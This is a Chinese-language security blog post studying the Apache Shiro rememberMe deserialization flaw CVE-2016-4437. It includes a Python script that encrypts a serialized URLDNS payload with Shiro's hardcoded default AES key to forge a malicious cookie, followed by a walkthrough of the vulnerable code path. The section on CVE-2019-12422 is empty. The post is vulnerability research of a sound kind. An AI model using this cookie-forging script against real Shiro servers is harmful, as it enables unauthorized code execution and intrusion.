---
layout:     post
title:      "Shiro反序列化漏洞学习"
subtitle:   ""
date:       2021-06-11 20:13:14
author:     "kuron3k0"
header-img: "img/post-bg-2015.jpg"
tags:
    - Java
---

前面把shiro近期的权限绕过漏洞过了一下，现在把反序列化的也搞一搞

## CVE-2016-4437(ver < 1.2.5)
对比1.2.4和1.2.5代码的区别，把默认的AES加密秘钥删掉了
![](/img/in-post/shiro-deserialize/1.png)

这里用urldns来反序列化，用默认的秘钥加密一下
```python
from Crypto.Cipher import AES
import base64
from Crypto import Random

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]

class AESCipher:
    def __init__( self, key ):
        """
        Requires hex encoded param as a key
        """
        self.key = key

    def encrypt( self, raw ):
        """
        Returns hex encoded encrypted value!
        """
        raw = pad(raw)
        iv = Random.new().read(AES.block_size);
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        """
        Requires hex encoded param to decrypt
        """
        enc = enc.decode("hex")
        iv = enc[:16]
        enc= enc[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc))

if __name__== "__main__":
    key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
    with open('shiro_urldns','rb') as f:
        s=f.read()
    encryptor = AESCipher(key)
    plaintext = encryptor.encrypt(s)
    print("%s" % plaintext)

```

放到rememberMe的cookie中
![](/img/in-post/shiro-deserialize/3.png)

反序列化成功
![](/img/in-post/shiro-deserialize/2.png)

过程挺简单，先是从AbstractShiroFilter开始，调用createSubject函数创建Subject
![](/img/in-post/shiro-deserialize/4.png)

后面会到CookieRememberMeManager，base64解码
![](/img/in-post/shiro-deserialize/6.png)

cookie名在初始化的时候指定为rememberMe
![](/img/in-post/shiro-deserialize/5.png)

用默认秘钥进行AES解密
![](/img/in-post/shiro-deserialize/7.png)

最后readObject反序列化
![](/img/in-post/shiro-deserialize/8.png)


## CVE-2019-12422(ver < 1.4.2)


## 参考
[https://github.com/apache/shiro/compare/shiro-root-1.2.4%E2%80%A6shiro-root-1.2.5](https://github.com/apache/shiro/compare/shiro-root-1.2.4%E2%80%A6shiro-root-1.2.5)
[https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e](https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e)